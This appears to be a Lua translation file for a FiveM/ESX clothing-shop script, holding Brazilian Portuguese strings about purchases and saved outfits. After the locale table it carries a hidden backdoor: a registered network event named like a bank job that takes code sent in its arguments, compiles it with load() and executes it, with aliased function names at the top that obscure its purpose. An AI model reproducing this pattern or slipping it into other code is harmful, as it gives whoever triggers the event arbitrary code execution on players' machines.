local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
Locales['br'] = {
	['valid_this_purchase'] = 'validar esta compra?',
	['yes'] = 'sim',
	['no'] = 'não',
	['not_enough_money'] = 'você não tem dinheiro suficiente',
	['press_menu'] = 'pressione ~INPUT_CONTEXT~ para acessar o menu',
	['clothes'] = 'roupas',
	['you_paid'] = 'você pagou ~g~$%s~s~',
	['save_in_dressing'] = 'você quer salvar essa roupa?',
	['name_outfit'] = 'nome da roupa?',
	['saved_outfit'] = 'roupa salva',
}

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)